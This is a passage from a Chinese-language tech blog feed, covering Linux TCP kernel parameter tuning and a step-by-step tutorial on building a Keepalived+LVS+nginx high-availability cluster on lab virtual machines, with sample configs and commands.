<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这几个参数，建议只在流量非常大的服务器上开启，会有显著的效果。一般的流量小的服务器上，没有必要去设置这几个参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 表示当keepalive起用的时候，TCP发送keepalive消息的频度。缺省是2小时，改为20分钟。</span></span><br><span class="line">net.ipv4.tcp_keepalive_time = 1200</span><br><span class="line"></span><br><span class="line"><span class="comment"># 表示用于向外连接的端口范围。缺省情况下很小：32768到61000，改为10000到65000。（注意：这里不要将最低值设的太低，否则可能会占用掉正常的端口！）</span></span><br><span class="line">net.ipv4.ip_local_port_range = 10000 65000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 表示SYN队列的长度，默认为1024，加大队列长度为8192，可以容纳更多等待连接的网络连接数。</span></span><br><span class="line">net.ipv4.tcp_max_syn_backlog = 8192</span><br><span class="line"></span><br><span class="line"><span class="comment"># 表示系统同时保持TIME_WAIT的最大数量，如果超过这个数字，TIME_WAIT将立刻被清除并打印警告信息。默 认为180000，改为6000。对于Apache、Nginx等服务器，上几行的参数可以很好地减少TIME_WAIT套接字数量，但是对于Squid，效果却不大。此项参数可以控制TIME_WAIT的最大数量，避免Squid服务器被大量的TIME_WAIT拖死。</span></span><br><span class="line">net.ipv4.tcp_max_tw_buckets = 5000</span><br></pre></td></tr></table></figure>

<h3 id="其他TCP参数说明"><a href="#其他TCP参数说明" class="headerlink" title="其他TCP参数说明"></a>其他TCP参数说明</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 记录的那些尚未收到客户端确认信息的连接请求的最大值。对于有128M内存的系统而言，缺省值是1024，小内存的系统则是128。</span></span><br><span class="line">net.ipv4.tcp_max_syn_backlog = 65536</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每个网络接口接收数据包的速率比内核处理这些包的速率快时，允许送到队列的数据包的最大数目。</span></span><br><span class="line">net.core.netdev_max_backlog = 32768</span><br><span class="line"></span><br><span class="line"><span class="comment"># web应用中listen函数的backlog默认会给我们内核参数的net.core.somaxconn限制到128，而nginx定义的NGX_LISTEN_BACKLOG默认为511，所以有必要调整这个值。</span></span><br><span class="line">net.core.somaxconn = 32768</span><br><span class="line"></span><br><span class="line">net.core.wmem_default = 8388608</span><br><span class="line"></span><br><span class="line">net.core.rmem_default = 8388608</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最大socket读buffer,可参考的优化值:873200</span></span><br><span class="line">net.core.rmem_max = 16777216</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最大socket写buffer,可参考的优化值:873200</span></span><br><span class="line">net.core.wmem_max = 16777216</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间戳可以避免序列号的卷绕。一个1Gbps的链路肯定会遇到以前用过的序列号。时间戳能够让内核接受这种“异常”的数据包。这里需要将其关掉。</span></span><br><span class="line">net.ipv4.tcp_timestsmps = 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为了打开对端的连接，内核需要发送一个SYN并附带一个回应前面一个SYN的ACK。也就是所谓三次握手中的第二次握手。这个设置决定了内核放弃连接之前发送SYN+ACK包的数量。</span></span><br><span class="line">net.ipv4.tcp_synack_retries = 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在内核放弃建立连接之前发送SYN包的数量。</span></span><br><span class="line">net.ipv4.tcp_syn_retries = 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接。</span></span><br><span class="line"><span class="comment">#net.ipv4.tcp_tw_len = 1</span></span><br><span class="line">net.ipv4.tcp_tw_reuse = 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># TCP写buffer,可参考的优化值: 8192 436600 873200</span></span><br><span class="line">net.ipv4.tcp_wmem = 8192 436600 873200</span><br><span class="line"></span><br><span class="line"><span class="comment"># TCP读buffer,可参考的优化值: 32768 436600 873200</span></span><br><span class="line">net.ipv4.tcp_rmem  = 32768 436600 873200</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同样有3个值,意思是:</span></span><br><span class="line"><span class="comment"># net.ipv4.tcp_mem[0]:低于此值，TCP没有内存压力。</span></span><br><span class="line"><span class="comment"># net.ipv4.tcp_mem[1]:在此值下，进入内存压力阶段。</span></span><br><span class="line"><span class="comment"># net.ipv4.tcp_mem[2]:高于此值，TCP拒绝分配socket。</span></span><br><span class="line"><span class="comment"># 上述内存单位是页，而不是字节。可参考的优化值是:786432 1048576 1572864</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统中最多有多少个TCP套接字不被关联到任何一个用户文件句柄上。</span></span><br><span class="line"><span class="comment"># 如果超过这个数字，连接将即刻被复位并打印出警告信息。</span></span><br><span class="line"><span class="comment"># 这个限制仅仅是为了防止简单的DoS攻击，不能过分依靠它或者人为地减小这个值，</span></span><br><span class="line">net.ipv4.tcp_max_orphans = 3276800</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更应该增加这个值(如果增加了内存之后)。</span></span><br><span class="line"><span class="comment"># 如果套接字由本端要求关闭，这个参数决定了它保持在FIN-WAIT-2状态的时间。对端可以出错并永远不关闭连接，甚至意外当机。缺省值是60秒。2.2 内核的通常值是180秒，可以按这个设置，但要记住的是，即使机器是一个轻载的WEB服务器，也有因为大量的死套接字而内存溢出的风险，FIN- WAIT-2的危险性比FIN-WAIT-1要小，因为它最多只能吃掉1.5K内存，但是它们的生存期长些。</span></span><br><span class="line">net.ipv4.tcp_fin_timeout = 30</span><br><span class="line"></span><br><span class="line"><span class="comment">#TCP快速打开（TCP Fast Open，TFO）是对TCP的一种简化握手手续的拓展，用于提高两端点间连接的打开速度</span></span><br><span class="line">net.ipv4.tcp_fastopen = 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>经过这样的优化配置之后，服务器的TCP并发处理能力会显著提高。以上配置仅供参考，用于生产环境请根据自己的实际情况。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Keepalived+LVS+nginx 搭建 nginx 高可用集群</title>
    <url>/post/36452/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>nginx 是一款非常优秀的反向代理工具，支持请求分发，负载均衡，以及缓存等等非常实用的功能。在请求处理上，nginx 采用的是 epoll 模型，这是一种基于事件监听的模型，因而其具备非常高效的请求处理效率，单机并发能力能够达到上百万。nginx 接收到的请求可以通过负载均衡策略分发到其下一级的应用服务器，这些服务器一般是以集群方式部署的，因而在性能不足的情况下，应用服务器可以通过加机器的方式扩展流量。此时，对于一些特大型的网站，性能的瓶颈就来自于 nginx 了，因为单机的 nginx 的并发能力是有上限的，而 nginx 本身是不支持集群模式的，因而此时对 nginx 的横向扩展就显得尤为重要。</p>
<span id="more"></span>

<p>keepalived 是一款服务器状态检测和故障切换的工具。在其配置文件中，可以配置主备服务器和该服务器的状态检测请求。也就是说 keepalived 可以根据配置的请求，在提供服务期间不断向指定服务器发送请求，如果该请求返回的状态码是 200，则表示该服务器状态是正常的，如果不正常，那么 keepalived 就会将该服务器给下线掉，然后将备用服务器设置为上线状态。</p>
<p>lvs 是一款用于四层负载均衡的工具。所谓的四层负载均衡，对应的是网络七层协议，常见的如 HTTP 协议是建立在七层协议上的，而 lvs 作用于四层协议上，也即：传输层，网络层，数据链路层和物理层。这里的传输层主要协议有 TCP 和 UDP 协议，也就是说 lvs 主要支持的方式是 TCP 和 UDP。也正是因为 lvs 是处于四层负载均衡上的，因而其处理请求的能力比常见的服务器要高非常多，比如 nginx 的请求处理就是建立在网络七层上的，lvs 的负载均衡能力是 nginx 的十倍以上。</p>
<p>通过上面的介绍，我们可以发现，在特大型网站中，应用服务器是可以横向扩容的，而 nginx 是不支持横向扩容的，此时 nginx 就会成为性能瓶颈。而 lvs 是一款负载均衡工具，因而如果我们结合 lvs 和 nginx，那么就可以通过部署多台 nginx 服务器，通过 lvs 的负载均衡能力，将请求均衡的分发到各个 nginx 服务器上，再由 nginx 服务器分发到各个应用服务器，这样，我们就实现了 nginx 的横向扩展了。由于 nginx 本质上也是一款应用服务器，因而其也有可能宕机，因而这里结合 keepalived 就可以实现 nginx 的故障检测和服务切换。也就是说，通过 keepalived+lvs+nginx，我们实现了 nginx 的高可用集群模式。</p>
<p>在上面的介绍中，我们会注意到，虽然 keepalived+lvs+nginx 实现了 nginx 的集群模式，但是在我们使用 nginx 的时候，其本身是有一个 ip 和端口的，默认监听的端口是 80 和 443，那么 lvs 是如何实现将请求分发给具有不同 ip 和端口的 nginx 服务器的呢？这里就是通过虚拟 ip 实现的，所谓虚拟 ip 就是对外提供一个公共的 ip，外部客户端请求的都是这个 ip，lvs 在接收到虚拟 ip 的请求之后，通过配置的调度器和负载均衡策略，选择一个目标 nginx 服务器，然后将请求转发给该服务器。这里 lvs 有两个概念，就是调度器和负载均衡策略，所谓的调度器指的是 lvs 将会以何种方式处理请求和响应数据，其主要有三种调度器：</p>
<ul>
<li>  Virtual Server via Network Address Translation(VS/NAT)：这种方式的主要原理是，用户发送请求到虚拟 ip 上后，lvs 会根据负载均衡算法选择一个目标处理服务，然后将请求报文中的目标 ip 地址修改为计算得到的目标服务器，并且发送给该服务器。对于响应的报文，调度器会将目标服务器返回的响应数据中的源地址修改为虚拟 ip 地址。通过这种方式，对客户端而言，其形式上面向的是一台服务器。不过这种方式的缺点在于，所有的响应数据都需要通过调度器，如果请求量比较大的情况下，那么调度器就会成为整个系统的瓶颈。</li>
<li>  Virtual Server via IP Tunneling(VS/TUN)：这种方式主要解决的就是 VS/NAT 中，响应数据会经过调度器的问题。同 VS/NAT 一样 ，调度器还是会接收请求的数据，并且将报文中的目标 ip 修改为目标服务的 ip，但是在目标服务处理完数据之后，其会直接将响应报文中的源 ip 修改为虚拟 ip，然后将请求发送给客户端。通过这种方式，响应数据就由各个目标服务进行了处理，而无需通过调度器进行返回，这种方式会大大提高系统的吞吐量，而且由于一般请求报文比响应报文小很多，调度器也只需要处理请求报文，那么系统的整体负载将会被均摊到各个服务器上。</li>
<li>  Virtual Server via Direct Routing(VS/DR)：这种方式相对于 VS/TUN，其主要区别在于，VS/TUN 是将请求报文中的 ip 地址修改为目标服务的 ip 地址，而 VS/DR 则是直接将请求报文中的 MAC 地址修改为目标地址，这种方式效率会更高，因为 VS/TUN 中的 ip 地址最终还是需要转换为 MAC 地址来发送数据的。</li>
</ul>
<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>. VMware;</span><br><span class="line"><span class="attribute">2</span>. <span class="number">4</span>台CentOs<span class="number">7</span>虚拟主机：<span class="number">172.16.28.130</span>, <span class="number">172.16.28.131</span>, <span class="number">172.16.28.132</span>, <span class="number">172.16.28.133</span></span><br><span class="line"><span class="attribute">3</span>. 系统服务：LVS, Keepalived</span><br><span class="line"><span class="attribute">4</span>. Web服务器：nginx</span><br><span class="line"><span class="attribute">5</span>. 集群搭建：LVS DR模式</span><br></pre></td></tr></table></figure>

<h3 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h3><p>在四台虚拟机上，我们以如下方式搭建集群：</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">172.16.28.130</span> lvs+keepalived</span><br><span class="line"><span class="number">172.16.28.131</span> lvs+keepalived</span><br><span class="line"><span class="number">172.16.28.132</span> nginx</span><br><span class="line"><span class="number">172.16.28.133</span> nginx</span><br></pre></td></tr></table></figure>

<p>这里我们使用<code>172.16.28.130</code>和<code>172.16.28.131</code>两台机器作为<code>lvs+keepalived</code>的工作机器，也就是说这两台机器的作用主要是进行负载均衡和故障检测和下线的；我们使用<code>172.16.28.132</code>和<code>172.16.28.133</code>两台机器作为应用服务器，主要是对外提供服务的。这四台服务器作为整个后端集群服务，并且对外提供的虚拟 ip 是<code>172.16.28.120</code>。需要说明的是，这里的<code>keepalived</code>所检测的服务是两台<code>lvs</code>服务器，这两台服务器，一台作为 master 服务器，一台作为 backup 服务器，两者在负载均衡的配置上是完全一样的。在正常情况下，客户端请求虚拟 ip 的时候，<code>lvs</code>会将该请求转发到 master 服务器上，然后 master 服务器根据配置的负载均衡策略选择一台应用服务器，并且将请求发送给该应用服务器进行处理。如果在某个时刻，lvs 的 master 服务器由于故障宕机了，keepalived 就会检测到该故障，并且进行故障下线，然后将 backup 机器上线用于提供服务，从而实现故障转移的功能。</p>
<h4 id="lvs-keepalived-安装"><a href="#lvs-keepalived-安装" class="headerlink" title="lvs+keepalived 安装"></a>lvs+keepalived 安装</h4><p>在<code>172.16.28.130</code>和<code>172.16.28.131</code>上安装 ipvs 和 keepalived：</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装ipvs</span></span><br><span class="line">sudo yum <span class="keyword">install</span> ipvsadm</span><br></pre></td></tr></table></figure>

<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装keepalived</span></span><br><span class="line">sudo yum <span class="keyword">install</span> keepalived</span><br></pre></td></tr></table></figure>

<p>在<code>172.16.28.132</code>和<code>172.16.28.133</code>上安装 nginx：</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装nginx</span></span><br><span class="line">sudo yum <span class="keyword">install</span> nginx</span><br></pre></td></tr></table></figure>

<p>需要注意的是，在两台 nginx 服务器上需要将防火墙关闭，否则 lvs+keepalived 的两台机器就无法将请求发送到两台 nginx 服务器上来：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭防火墙</span></span><br><span class="line">systemctl <span class="builtin-name">disable</span> firewalld.service</span><br></pre></td></tr></table></figure>

<p>查看两台负载均衡机器是否支持 lvs：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">sudo lsmod <span class="string">|grep ip_vs</span></span><br></pre></td></tr></table></figure>

<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 如果看到如下结果，则说明是支持的</span></span><br><span class="line">[zhangxufeng@localhost ~]$ sudo lsmod|grep ip_vs</span><br><span class="line">ip_vs                <span class="number"> 145497 </span> 0</span><br><span class="line">nf_conntrack         <span class="number"> 137239 </span><span class="number"> 1 </span>ip_vs</span><br><span class="line">libcrc32c             <span class="number"> 12644 </span><span class="number"> 3 </span>xfs,ip_vs,nf_conntrack</span><br></pre></td></tr></table></figure>

<p>如果上述命令没有任何结果，则执行<code>sudo ipvsadm</code>命令启动 ipvs 之后，再通过上述命令进行查看即可。启动 ipvs 之后，我们就可以在<code>/etc/keepalived/</code>目录下编辑<code>keepalived.conf</code>文件，我们以<code>172.16.28.130</code>机器作为 master 机器，master 节点配置如下：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># Global Configuration</span></span><br><span class="line"><span class="class">global_defs </span>&#123;</span><br><span class="line">  lvs_id director1  <span class="meta"># 指定lvs的id</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># VRRP Configuration</span></span><br><span class="line">vrrp_instance <span class="class">LVS </span>&#123;</span><br><span class="line">  state MASTER	<span class="meta"># 指定当前节点为master节点</span></span><br><span class="line">  interface ens33	<span class="meta"># 这里的ens33是网卡的名称，通过ifconfig或者ip addr可以查看</span></span><br><span class="line">  virtual_router_id <span class="number">51</span>	<span class="meta"># 这里指定的是虚拟路由id，master节点和backup节点需要指定一样的</span></span><br><span class="line">  priority <span class="number">151</span>	<span class="meta"># 指定了当前节点的优先级，数值越大优先级越高，master节点要高于backup节点</span></span><br><span class="line">  advert_int <span class="number">1</span>	<span class="meta"># 指定发送VRRP通告的间隔，单位是秒</span></span><br><span class="line">  <span class="class">authentication </span>&#123;</span><br><span class="line">    auth_type PASS	<span class="meta"># 鉴权，默认通过</span></span><br><span class="line">    auth_pass <span class="number">123456</span>	<span class="meta"># 鉴权访问密码</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class">virtual_ipaddress </span>&#123;</span><br><span class="line">    <span class="number">172.16</span><span class="number">.28</span><span class="number">.120</span>	<span class="meta"># 指定了虚拟ip</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># Virtual Server Configuration - for www server</span></span><br><span class="line"><span class="meta"># 后台真实主机的配置</span></span><br><span class="line">virtual_server <span class="number">172.16</span><span class="number">.28</span><span class="number">.120</span> <span class="number">80</span> &#123;</span><br><span class="line">  delay_loop <span class="number">1</span>	<span class="meta"># 健康检查的时间间隔</span></span><br><span class="line">  lb_algo rr	<span class="meta"># 负载均衡策略，这里是轮询</span></span><br><span class="line">  lb_kind DR	<span class="meta"># 调度器类型，这里是DR</span></span><br><span class="line">  persistence_time <span class="number">1</span>	<span class="meta"># 指定了持续将请求打到同一台真实主机的时间长度</span></span><br><span class="line">  protocol TCP	<span class="meta"># 指定了访问后台真实主机的协议类型</span></span><br><span class="line"></span><br><span class="line">  <span class="meta"># Real Server 1 configuration</span></span><br><span class="line">  <span class="meta"># 指定了真实主机1的ip和端口</span></span><br><span class="line">  real_server <span class="number">172.16</span><span class="number">.28</span><span class="number">.132</span> <span class="number">80</span> &#123;</span><br><span class="line">    weight <span class="number">1</span>	<span class="meta"># 指定了当前主机的权重</span></span><br><span class="line">    <span class="class">TCP_CHECK </span>&#123;</span><br><span class="line">      connection_timeout <span class="number">10</span>	<span class="meta"># 指定了进行心跳检查的超时时间</span></span><br><span class="line">      nb_get_retry <span class="number">3</span>	<span class="meta"># 指定了心跳超时之后的重复次数</span></span><br><span class="line">      delay_before_retry <span class="number">3</span>	<span class="meta"># 指定了在尝试之前延迟多长时间</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta"># Real Server 2 Configuration</span></span><br><span class="line">  real_server <span class="number">172.16</span><span class="number">.28</span><span class="number">.133</span> <span class="number">80</span> &#123;</span><br><span class="line">    weight <span class="number">1</span>	<span class="meta"># 指定了当前主机的权重</span></span><br><span class="line">    <span class="class">TCP_CHECK </span>&#123;</span><br><span class="line">      connection_timeout <span class="number">10</span>	<span class="meta"># 指定了进行心跳检查的超时时间</span></span><br><span class="line">      nb_get_retry <span class="number">3</span>	<span class="meta"># 指定了心跳超时之后的重复次数</span></span><br><span class="line">      delay_before_retry <span class="number">3</span>	<span class="meta"># 指定了在尝试之前延迟多长时间</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面是 master 节点上 keepalived 的配置，对于 backup 节点，其配置与 master 几乎是一致的，只是其 state 和 priority 参数不同。如下是 backup 节点的完整配置：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># Global Configuration</span></span><br><span class="line"><span class="class">global_defs </span>&#123;</span><br><span class="line">  lvs_id director2  <span class="meta"># 指定lvs的id</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># VRRP Configuration</span></span><br><span class="line">vrrp_instance <span class="class">LVS </span>&#123;</span><br><span class="line">  state BACKUP	<span class="meta"># 指定当前节点为master节点</span></span><br><span class="line">  interface ens33	<span class="meta"># 这里的ens33是网卡的名称，通过ifconfig或者ip addr可以查看</span></span><br><span class="line">  virtual_router_id <span class="number">51</span>	<span class="meta"># 这里指定的是虚拟路由id，master节点和backup节点需要指定一样的</span></span><br><span class="line">  priority <span class="number">150</span>	<span class="meta"># 指定了当前节点的优先级，数值越大优先级越高，master节点要高于backup节点</span></span><br><span class="line">  advert_int <span class="number">1</span>	<span class="meta"># 指定发送VRRP通告的间隔，单位是秒</span></span><br><span class="line">  <span class="class">authentication </span>&#123;</span><br><span class="line">    auth_type PASS	<span class="meta"># 鉴权，默认通过</span></span><br><span class="line">    auth_pass <span class="number">123456</span>	<span class="meta"># 鉴权访问密码</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class">virtual_ipaddress </span>&#123;</span><br><span class="line">    <span class="number">172.16</span><span class="number">.28</span><span class="number">.120</span>	<span class="meta"># 指定了虚拟ip</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># Virtual Server Configuration - for www server</span></span><br><span class="line"><span class="meta"># 后台真实主机的配置</span></span><br><span class="line">virtual_server <span class="number">172.16</span><span class="number">.28</span><span class="number">.120</span> <span class="number">80</span> &#123;</span><br><span class="line">  delay_loop <span class="number">1</span>	<span class="meta"># 健康检查的时间间隔</span></span><br><span class="line">  lb_algo rr	<span class="meta"># 负载均衡策略，这里是轮询</span></span><br><span class="line">  lb_kind DR	<span class="meta"># 调度器类型，这里是DR</span></span><br><span class="line">  persistence_time <span class="number">1</span>	<span class="meta"># 指定了持续将请求打到同一台真实主机的时间长度</span></span><br><span class="line">  protocol TCP	<span class="meta"># 指定了访问后台真实主机的协议类型</span></span><br><span class="line"></span><br><span class="line">  <span class="meta"># Real Server 1 configuration</span></span><br><span class="line">  <span class="meta"># 指定了真实主机1的ip和端口</span></span><br><span class="line">  real_server <span class="number">172.16</span><span class="number">.28</span><span class="number">.132</span> <span class="number">80</span> &#123;</span><br><span class="line">    weight <span class="number">1</span>	<span class="meta"># 指定了当前主机的权重</span></span><br><span class="line">    <span class="class">TCP_CHECK </span>&#123;</span><br><span class="line">      connection_timeout <span class="number">10</span>	<span class="meta"># 指定了进行心跳检查的超时时间</span></span><br><span class="line">      nb_get_retry <span class="number">3</span>	<span class="meta"># 指定了心跳超时之后的重复次数</span></span><br><span class="line">      delay_before_retry <span class="number">3</span>	<span class="meta"># 指定了在尝试之前延迟多长时间</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta"># Real Server 2 Configuration</span></span><br><span class="line">  real_server <span class="number">172.16</span><span class="number">.28</span><span class="number">.133</span> <span class="number">80</span> &#123;</span><br><span class="line">    weight <span class="number">1</span>	<span class="meta"># 指定了当前主机的权重</span></span><br><span class="line">    <span class="class">TCP_CHECK </span>&#123;</span><br><span class="line">      connection_timeout <span class="number">10</span>	<span class="meta"># 指定了进行心跳检查的超时时间</span></span><br><span class="line">      nb_get_retry <span class="number">3</span>	<span class="meta"># 指定了心跳超时之后的重复次数</span></span><br><span class="line">      delay_before_retry <span class="number">3</span>	<span class="meta"># 指定了在尝试之前延迟多长时间</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将 master 和 backup 配置成完全一样的原因是，在 master 宕机时，可以根据 backup 的配置进行服务的无缝切换。</p>
<p>在 lvs+keepalived 机器配置完成之后，我们下面配置两台应用服务器的 nginx 配置。这里我们是将 nginx 作为应用服务器，在其配置文件中配置返回状态码为 200，并且会将当前主机的 ip 返回，如下是其配置：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">worker_processes</span> auto;</span><br><span class="line"><span class="comment"># pid /run/nginx.pid;</span></span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">  <span class="attribute">worker_connections</span> <span class="number">786</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">  <span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这里是直接返回200状态码和一段文本</span></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">      <span class="attribute">default_type</span> text/html;</span><br><span class="line">      <span class="attribute">return</span> <span class="number">200</span> <span class="string">&quot;Hello, Nginx! Server zhangxufeng@172.16.28.132\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">worker_processes</span> auto;</span><br><span class="line"><span class="comment"># pid /run/nginx.pid;</span></span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">  <span class="attribute">worker_connections</span> <span class="number">786</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">  <span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这里是直接返回200状态码和一段文本</span></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">      <span class="attribute">default_type</span> text/html;</span><br><span class="line">      <span class="attribute">return</span> <span class="number">200</span> <span class="string">&quot;Hello, Nginx! Server zhangxufeng@172.16.28.133\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，两台机器返回的文本中主机 ip 是不一样的。nginx 配置完成后，可以通过如下命令进行启动：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo nginx</span></span><br></pre></td></tr></table></figure>

<p>在启动 nginx 之后，我们需要配置虚拟 ip，这是因为我们使用的 lvs 调度器是 DR 模式，前面我们讲到过，这种模式下，对客户端的响应是真实服务器直接返回给客户端的，而真实服务器需要将响应报文中的源 ip 修改为虚拟 ip，这里配置的虚拟 ip 就是起这个作用的。我们编辑<code>/etc/init.d/lvsrs</code>文件，写入如下内容：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">ifconfig lo:<span class="number">0</span> <span class="number">172.16</span>.<span class="number">28.120</span> netmask <span class="number">255.255</span>.<span class="number">255.255</span> broadcast <span class="number">172.16</span>.<span class="number">28.120</span> up</span><br><span class="line">route add -host <span class="number">172.16</span>.<span class="number">28.120</span> dev lo:<span class="number">0</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;0&quot;</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/net/i</span>pv4/ip_forward</span><br><span class="line">echo <span class="string">&quot;1&quot;</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/net/i</span>pv4<span class="regexp">/conf/</span>lo/arp_ignore</span><br><span class="line">echo <span class="string">&quot;2&quot;</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/net/i</span>pv4<span class="regexp">/conf/</span>lo/arp_announce</span><br><span class="line">echo <span class="string">&quot;1&quot;</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/net/i</span>pv4<span class="regexp">/conf/</span>all/arp_ignore</span><br><span class="line">echo <span class="string">&quot;2&quot;</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/net/i</span>pv4<span class="regexp">/conf/</span>all/arp_announce</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<ul>
<li>  lo：表示当前主机真实网卡的名称；</li>
<li>  172.16.28.120：表示虚拟 ip；</li>
</ul>
<p>编写完成后运行该脚本文件即可。然后将两台 lvs+keepalived 机器上的 keepalived 服务启动起来即可：</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">sudo service keepalived <span class="literal">start</span></span><br></pre></td></tr></table></figure>

<p>最后可以通过如下命令查看配置的 lvs+keepalived 的策略：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[zhangxufeng@localhost keepalived]$ sudo ipvsadm -ln<span class="built_in"></span></span><br><span class="line"><span class="built_in">IP </span>Virtual<span class="built_in"> Server </span>version 1.2.1 (<span class="attribute">size</span>=4096)</span><br><span class="line">Prot LocalAddress:Port<span class="built_in"> Scheduler </span>Flags</span><br><span class="line">  -&gt; RemoteAddress:Port           Forward Weight ActiveConn InActConn</span><br><span class="line">TCP  172.16.28.120:80 rr</span><br><span class="line">  -&gt; 172.16.28.132:80            <span class="built_in"> Route </span>  1      0          0</span><br></pre></td></tr></table></figure>

<h4 id="集群测试"><a href="#集群测试" class="headerlink" title="集群测试"></a>集群测试</h4><p>根据上述步骤，我们配置完成了一个 lvs+keepalived+nginx 的集群。在浏览器中，我们可以访问<code>http://172.16.28.120</code>即可看到如下响应：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Hello, Nginx! Server <span class="symbol">zhangxufeng@</span><span class="number">172.16</span><span class="number">.28</span><span class="number">.132</span></span><br></pre></td></tr></table></figure>

<p>多次刷新浏览器之后，可以看到浏览器中显示的文本切换如下，这是因为 lvs 的负载均衡策略产生的：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Hello, Nginx! Server <span class="symbol">zhangxufeng@</span><span class="number">172.16</span><span class="number">.28</span><span class="number">.133</span></span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文首先对 lvs 和 keepalived 的工作原理进行了讲解，分别介绍了其工作的几种模式，然后对 lvs+keepalived+nginx 搭建 nginx 集群的方式进行详细讲解，并且说明了其中所需要注意的问题。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot常用配置整合</title>
    <url>/post/33451/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SpringBoot常用配置整合，方便参考</p>
<span id="more"></span>

